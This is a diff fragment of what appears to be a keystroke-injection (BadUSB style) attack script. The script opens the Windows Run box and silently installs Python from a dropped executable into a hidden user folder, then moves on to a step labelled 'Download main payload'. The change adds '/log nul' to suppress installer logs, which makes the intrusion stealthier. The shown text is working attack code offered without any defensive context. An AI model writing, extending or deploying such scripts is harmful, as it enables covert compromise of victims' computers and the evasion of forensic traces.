@@ -30,7 +30,7 @@ DELAY 500
 REM Install python
 GUI r
 DELAY 100
-STRING start /b %localappdata%\temp\tmp7.exe /quiet TargetDir=%localappdata%\python1 AssociateFiles=0 CompileAll=1 Include_doc=0 Include_launcher=0 Include_tcltk=0 Include_test=0
+STRING start /b %localappdata%\temp\tmp7.exe /log nul /quiet TargetDir=%localappdata%\python1 AssociateFiles=0 CompileAll=1 Include_doc=0 Include_launcher=0 Include_tcltk=0 Include_test=0
 DELAY 30000
 
 REM Download main payload
